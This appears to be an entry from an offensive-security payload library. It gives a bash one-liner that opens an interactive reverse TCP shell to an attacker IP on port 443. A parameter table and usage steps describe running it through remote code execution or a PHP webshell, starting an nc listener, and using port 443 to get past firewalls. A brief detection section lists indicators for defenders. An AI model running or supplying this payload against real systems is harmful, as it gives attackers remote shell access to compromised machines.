---
id: 18e9b28b-a2fa-4283-b4f5-c0207ee46fa3
type: code
language: bash
verified: true
created_at: '2020-03-23T01:40:23.294998+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Linux
tags:
  - reverse-shell
  - payload
  - bash
validated: true
---

# Bash-TCP-Reverse-Shell-to-Port-443

## Code

```bash
bash -i >& /dev/tcp/10.10.10.100/443 0>&1
```

## Description

A simple Bash one-liner that creates an interactive reverse TCP shell connecting back to the attacker's IP on port 443, redirecting stdin/stdout/stderr for full terminal access.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 10.10.10.100 | Attacker IP | 192.168.1.100 |
| 443 | Listener port (HTTPS common) | 4444 |

## Usage

Execute via RCE (e.g., PHP webshell ?cmd=) or download/pipe. Start listener with nc -lvnp 443 on attacker. Bypasses some firewalls by using port 443; requires Bash 4+ for /dev/tcp.

## Detection

- Network flows to unusual IPs on port 443 from web servers
- Process monitoring for bash spawning from web processes
- IDS signatures for /dev/tcp connections
- Shell history or command logs showing the one-liner

## Related

- [[procedures/Upgrade-Web-RCE-to-Reverse-Shell-on-Linux]]
